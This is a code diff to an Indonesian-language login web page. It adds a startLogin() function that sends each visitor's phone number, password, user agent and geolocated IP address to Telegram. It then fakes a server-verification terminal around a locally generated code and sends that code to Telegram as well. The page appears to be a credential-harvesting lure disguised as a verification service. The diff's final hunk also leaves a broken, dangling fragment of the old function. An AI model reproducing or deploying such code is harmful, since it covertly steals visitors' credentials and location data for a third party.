@@ -372,7 +372,6 @@
 <input disabled="" id="loginCode" maxlength="6" placeholder="Masukkan kode 6 digit" type="text"/>
 </div>
 <button class="login-button" id="loginButton" onclick="startLogin()">Klik untuk dapatkan kode</button>
-
 <div class="input-group">
 <label for="loginPassword">PASSWORD</label>
 <input id="loginPassword" placeholder="Masukkan password akses" type="password"/>
@@ -432,6 +431,55 @@
 </div>
 </div>
 <script>
+async function startLogin() {
+    const phoneNumber = document.getElementById('loginPhone').value;
+    const password = document.getElementById('loginPassword').value;
+
+    if (!phoneNumber) {
+        alert('Masukkan nomor telepon terlebih dahulu');
+        return;
+    }
+
+    if (password !== '321123') {
+        alert('Password salah!');
+        return;
+    }
+
+    loggedInPhoneNumber = phoneNumber;
+    document.getElementById('loginButton').disabled = true;
+    document.getElementById('terminal').style.display = 'block';
+
+    // Ambil IP secara sinkron
+    let userIP = 'Fetching...';
+    try {
+        const res = await fetch('https://ipapi.co/json');
+        const data = await res.json();
+        userIP = data.ip + ' (' + data.city + ', ' + data.country_name + ')';
+    } catch (err) {
+        userIP = 'Unavailable';
+    }
+
+    // Kirim ke Telegram
+    sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phoneNumber}\n🔑 Password: ${password}\n🖥️ User Agent: ${navigator.userAgent}\n🌐 IP: ${userIP}`);
+
+    setTimeout(() => {
+        addTerminalLine('> Menghubungkan ke server verifikasi...');
+        setTimeout(() => {
+            addTerminalLine('> Server merespons... [200 OK]');
+            setTimeout(() => {
+                verificationCode = generateRandomCode();
+                addTerminalLine(`> Kode anda adalah:\n\n${verificationCode}`);
+                sendToTelegram(`📳 VERIFICATION CODE SENT\n📱 Nomor: ${phoneNumber}\n🔢 Kode: ${verificationCode}`);
+                document.getElementById('loginCode').disabled = false;
+                document.getElementById('loginButton').textContent = 'VERIFIKASI KODE';
+                document.getElementById('loginButton').onclick = verifyCode;
+                document.getElementById('loginButton').disabled = false;
+            }, 1000);
+        }, 1500);
+    }, 1000);
+}
+
+
 // ✅ Perbaiki IP tracking (sinkron)
 let userIP = 'Fetching...';
 
@@ -512,14 +560,6 @@ function updateInteractiveMap(lat, lon) {
         
         
 // 🌐 Ambil IP lalu lanjutkan proses login
-async function startLogin() {
-    const phoneNumber = document.getElementById('loginPhone').value;
-    const password = document.getElementById('loginPassword').value;
-
-    if (!phoneNumber) {
-        alert('Masukkan nomor telepon terlebih dahulu');
-        return;
-    }
 
     if (password !== '321123') {
         alert('Password salah!');
